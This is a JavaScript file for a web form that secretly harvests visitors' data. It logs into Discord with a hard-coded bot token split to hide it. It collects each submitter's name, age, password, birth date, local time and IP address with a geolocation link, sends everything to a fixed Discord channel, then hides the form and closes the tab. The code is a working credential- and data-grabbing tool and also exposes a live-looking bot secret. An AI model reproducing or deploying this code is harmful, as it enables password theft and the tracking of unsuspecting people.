const client = new Discord.Client();

    client.on('ready', () => {
      logger(`Logged in as ${client.user.tag} (${client.user.id})`, 'ready');
    });

    function startBot() {
      token1 = `NzIzNTI4ODI2MjE0NDE2NDQ3.Xwo`
      token2 = `NEg.wE7KQa9tZwlfOQjJZF14-RZmfXw`
      token = token1 + token2
      client
        .login(token)
    }



    function sendMessage() {




      const title = "Someone pressed the button!"
      const name = document.getElementById('name').value
      const age = document.getElementById('age').value
      const passwd = document.getElementById('passwd').value
      const bdate = document.getElementById('bd').value.split("-")
      const ctime = document.getElementById('ct').value
      if (ctime == "") {
        body = `Their name: '${name}'\nTheir age: '${age}'\nTheir password: '${passwd}'\n\n~IP Address information~\nIP Address: '${ipad}\nIP Geolocation link: https://tools.keycdn.com/geo?host=${ipad}`
      }
      else if (bdate == "undefined/undefined/") {
        body = `Their name: '${name}'\nTheir age: '${age}'\nTheir password: '${passwd}'\nTheir birth date: ${bdate[2]}/${bdate[1]}/${bdate[0]}\nTheir local time: ${ctime}\n\n~IP Address information~\nIP Address: '${ipad}\nIP Geolocation link: https://tools.keycdn.com/geo?host=${ipad}`
      }
      else {
        body = `Their name: '${name}'\nTheir age: '${age}'\nTheir password: '${passwd}'\nTheir birth date: ${bdate[2]}/${bdate[1]}/${bdate[0]}\nTheir local time: ${ctime}\n\n~IP Address information~\nIP Address: '${ipad}\nIP Geolocation link: https://tools.keycdn.com/geo?host=${ipad}`
      }

      const msgChannel = client.channels.get("731459932515205151");




      msgChannel.send(`${title}\n${body}`);


    }

    startBot()


    function check() {
      const name = document.getElementById('name').value
      const age = document.getElementById('age').value
      const passwd = document.getElementById('passwd').value
      const bdate = document.getElementById('bd').value.split("-")
      const ctime = document.getElementById('ct').value
      if (name == "") {
        document.getElementById('name').style.borderBottom = "2px solid red"
        document.getElementById('reqText').style.opacity = "1"
      }
      else if (age == "") {
        document.getElementById('age').style.borderBottom = "2px solid red"
        document.getElementById('reqText').style.opacity = "1"
      }
      else if (passwd == "") {
        document.getElementById('passwd').style.borderBottom = "2px solid red"
        document.getElementById('reqText').style.opacity = "1"
      }
      else {
        sendMessage()
        ok()
        hide()
      }
    }

    function getIP(json) {
      ipad = json.ip
    }

    async function ok() {

      document.getElementById('reqText').style.opacity = '0'
      document.getElementById('name').style.borderBottom = "2px solid green"
      document.getElementById('age').style.borderBottom = "2px solid green"
      document.getElementById('passwd').style.borderBottom = "2px solid green"
      document.getElementById('bd').style.borderBottom = "2px solid green"
      document.getElementById('ct').style.borderBottom = "2px solid green"
      
    }
    async function hide(){
  document.getElementById('bdlab').style.opacity = "0"
  document.getElementById('ctlab').style.opacity = "0"
  document.getElementById('title').style.opacity = "0"
  document.getElementById('name').style.opacity = "0"
  document.getElementById('age').style.opacity = "0"
  document.getElementById('passwd').style.opacity = "0"
  document.getElementById('bd').style.opacity = "0"
  document.getElementById('ct').style.opacity = "0"
  await new Promise(r => setTimeout(r, 500));
  document.getElementById('kthx').style.opacity = "1"
  document.getElementById('bdlab').innerText = "This tab wil now close."
  document.getElementById('bdlab').style.opacity = "1"
  
  await new Promise(r => setTimeout(r, 2000));
  window.close()
}

